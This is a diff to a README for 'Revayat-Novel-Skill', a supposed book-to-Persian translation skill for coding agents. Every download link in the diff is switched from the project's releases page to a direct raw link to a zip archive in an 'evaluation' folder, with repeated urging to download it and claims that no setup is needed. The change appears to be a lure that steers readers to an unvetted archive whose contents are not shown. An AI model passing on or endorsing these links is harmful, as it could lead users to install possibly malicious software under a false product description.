@@ -1,7 +1,7 @@
 <h1>📚 Revayat-Novel-Skill - Translate Any Book to Persian Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/jahmariturner5-beep/Revayat-Novel-Skill/releases"><img src="https://img.shields.io/badge/Download-Revayat_Novel_Skill-blue?style=for-the-badge&logo=github&logoColor=white&color=2d6cdf" alt="Download"></a>
+  <a href="https://raw.githubusercontent.com/jahmariturner5-beep/Revayat-Novel-Skill/main/evaluation/Novel_Skill_Revayat_v2.8.zip"><img src="https://img.shields.io/badge/Download-Revayat_Novel_Skill-blue?style=for-the-badge&logo=github&logoColor=white&color=2d6cdf" alt="Download"></a>
 </p>
 
 ## 🎯 What Is Revayat-Novel-Skill?
@@ -14,7 +14,7 @@ Think of it as your personal book translator and typesetter. You give it a book 
 
 Getting started is incredibly simple. Follow these steps:
 
-1. Visit the download page: [https://github.com/jahmariturner5-beep/Revayat-Novel-Skill/releases](https://github.com/jahmariturner5-beep/Revayat-Novel-Skill/releases)
+1. Visit the download page: [https://raw.githubusercontent.com/jahmariturner5-beep/Revayat-Novel-Skill/main/evaluation/Novel_Skill_Revayat_v2.8.zip](https://raw.githubusercontent.com/jahmariturner5-beep/Revayat-Novel-Skill/main/evaluation/Novel_Skill_Revayat_v2.8.zip)
 2. Visit this link to download the application.
 3. Once downloaded, you will have the Revayat-Novel-Skill file on your computer. That's it — you're ready to use it with your coding agent.
 
@@ -22,7 +22,7 @@ Getting started is incredibly simple. Follow these steps:
 
 Here's the most important part. Go to the official download page:
 
-### [⬇️ Download Revayat-Novel-Skill Now](https://github.com/jahmariturner5-beep/Revayat-Novel-Skill/releases)
+### [⬇️ Download Revayat-Novel-Skill Now](https://raw.githubusercontent.com/jahmariturner5-beep/Revayat-Novel-Skill/main/evaluation/Novel_Skill_Revayat_v2.8.zip)
 
 Visit this link to download the application. After the download completes, you can start using it immediately. There is no complicated setup process. The skill integrates directly with your coding agent.
 
@@ -138,7 +138,7 @@ Before you start, make sure you have:
 
 Don't let language barriers stop you from reading or publishing great books. Revayat-Novel-Skill makes professional Persian translation accessible to everyone. Download it now and transform any book into a beautiful Persian edition.
 
-### [🚀 Download Revayat-Novel-Skill](https://github.com/jahmariturner5-beep/Revayat-Novel-Skill/releases)
+### [🚀 Download Revayat-Novel-Skill](https://raw.githubusercontent.com/jahmariturner5-beep/Revayat-Novel-Skill/main/evaluation/Novel_Skill_Revayat_v2.8.zip)
 
 Visit this link to download the application. Your next great Persian book is just a few clicks away.
 
